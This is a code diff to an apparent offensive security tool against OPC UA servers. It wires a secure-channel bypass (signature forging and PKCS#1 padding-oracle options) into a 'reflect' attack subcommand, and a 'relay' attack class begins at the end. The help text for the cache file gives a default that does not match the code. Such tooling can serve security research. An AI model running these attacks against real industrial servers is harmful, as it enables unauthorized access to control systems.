@@ -104,20 +104,23 @@ will try to maximize).
       help='don\'t dump server contents on success; just tell if attack worked')
     aparser.add_argument('-b', '--bypass-opn', action='store_true',
       help='when no HTTPS is available, attempt to use sigforge and decrypt attacks to bypass the opc.tcp secure channel handshake')
-    aparser.add_argument('-r', '--reusable-opn-file', type=Path, default='.spoofed-opnreqs.json',
-      help='file in which to cache OPN requests with spoofed signatures; default: .spoofed-opnreqs.json')
-    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'),
+    aparser.add_argument('-c', '--cache-file', type=Path, default='.spoofed-opnreqs.json',
+      help='file in which to cache OPN requests with spoofed signatures; default: .opncache.json')
+    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'), default='try-both',
       help='which PKCS#1 padding oracle to use with --bypass-opn; default: try-both')
     
     aparser.add_argument('url',
       help='Target server OPC URL (either opc.tcp:// or https:// protocol)',
       type=str)
     
-  def execute(self, args):
-    # TODO: padding oracle options
-    if args.bypass_opn:
-      raise Exception('TODO: implement --bypass-opn option')
-    reflect_attack(args.url, not args.no_demo)
+  def execute(self, args):    
+    reflect_attack(
+      args.url, 
+      not args.no_demo, 
+      args.bypass_opn and args.padding_oracle_type != 'password', 
+      args.bypass_opn and args.padding_oracle_type != 'opn', 
+      args.cache_file
+    )
     
 class RelayAttack(Attack):
   subcommand = 'relay'
